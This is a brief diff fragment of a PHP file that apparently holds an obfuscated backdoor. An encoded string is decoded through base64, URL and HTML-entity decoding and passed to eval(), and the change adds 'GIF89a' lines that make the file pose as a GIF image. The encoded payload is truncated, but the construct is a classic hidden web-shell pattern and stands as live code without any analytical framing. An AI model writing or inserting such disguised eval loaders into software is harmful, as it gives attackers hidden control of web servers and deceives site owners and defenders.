@@ -10,3 +10,6 @@ $JIBEG = "=USxaRAA/HvsWq+4ItvRwMfIX2bA6/+3MrJ9dXbXiq0oH/nswPI0hHfJ4W0k4N1Zg2OGEW
 eval(htmlspecialchars_decode(urldecode(base64_decode($ichal_jibeg))));
 exit;
 ?>
+GIF89a;
+GIF89aG;
+JIBEG;
